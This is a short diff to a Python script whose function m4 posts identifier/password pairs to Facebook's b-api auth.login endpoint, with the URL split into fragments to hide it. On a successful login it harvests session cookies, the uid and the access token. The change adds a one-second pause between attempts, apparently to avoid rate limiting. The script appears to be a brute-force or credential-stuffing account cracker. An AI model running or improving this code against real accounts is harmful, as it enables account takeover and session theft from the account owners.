@@ -1199,7 +1199,8 @@ def m4(idf,pwv):
             "X-FB-Server-Cluster": "True",
             'X-FB-HTTP-Engine': 'Liger'}
             url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
-            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).text
+            q = json.loads(po)
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     uid=str(q['uid'])
@@ -1219,6 +1220,7 @@ def m4(idf,pwv):
                             break
                     else:
                        continue
+                    time.sleep(1)
       loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(10)
